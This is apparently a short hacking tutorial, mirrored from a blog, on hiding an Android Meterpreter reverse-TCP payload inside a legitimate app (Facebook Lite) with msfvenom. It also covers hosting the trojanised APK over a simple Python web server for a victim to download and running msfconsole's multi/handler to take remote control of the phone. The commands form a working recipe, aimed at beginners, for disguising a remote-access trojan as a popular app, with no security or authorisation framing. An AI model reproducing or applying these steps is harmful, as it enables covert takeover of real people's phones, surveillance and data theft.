![](https://raw.githubusercontent.com/3X-M1L174RY/bookmarks/master/images/multiple-ways-to-bind-payloads-in-an-apk/intro.png)
Hey Folks, as we know beginners try to find the best ways that they can embed the payload into the original APK, But it takes their long time to do research on it. So in this article we will give you all the working methods, with the help of which you can quickly embed payloads in any application without wasting your time. But remember that you must have all dependencies before performing this activity and If you have not done so you can do by visiting here.

## Requirements
  - Kali Linux
  - APKsigner or Jarsigner [One of them]
  - APK Tool [Latest]
  - ZipAlign
  
Lets take a look 🙂 !!
  
## Inbuilt Method

As we have already discussed about it in our previous article, so if you want to get deeper information about it then go to above given link. Now first we download the app and also you can choose himself any application as per need.
![](https://raw.githubusercontent.com/3X-M1L174RY/bookmarks/master/images/multiple-ways-to-bind-payloads-in-an-apk/2.png)

You do not need to do more efforts, just go the location of the downloaded application, replace the IP address, choose the port yourself and jsut execute the command. After doing all this, if the dependencies are successfully installed then you will get success otherwise it will show an error due to not properly configuring the dependencies. <br><br>
`msfvenom -x facebook-lite.apk -p android/meterpreter/reverse_tcp lhost=192.168.1.10 lport=4444 -o facebook.apk`<br><br>
![](https://raw.githubusercontent.com/3X-M1L174RY/bookmarks/master/images/multiple-ways-to-bind-payloads-in-an-apk/3.png)<br>

In our case we would choose python service to share the payload to someone else.<br><br>
`python -m SimpleHTTPServer`<br><br>
![](https://raw.githubusercontent.com/3X-M1L174RY/bookmarks/master/images/multiple-ways-to-bind-payloads-in-an-apk/4.png)

The payload will look like this when the victim downloads it to their smartphone.

![](https://raw.githubusercontent.com/3X-M1L174RY/bookmarks/master/images/multiple-ways-to-bind-payloads-in-an-apk/5.png)

**Done** 🙂 !! Time to take advantage and we have to boot our msfconsole to kept the meterpreter session. Just execute the following command and after comes the meterpreter session we can control the victim phone remotely.

```
msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set lhost 192.168.1.10
set lport 4444
run
```

![](https://raw.githubusercontent.com/3X-M1L174RY/bookmarks/master/images/multiple-ways-to-bind-payloads-in-an-apk/6.png)

# READ FULL ARTICLE HERE 
https://secnhack.in/multiple-ways-to-embed-a-payload-in-an-original-apk-file/


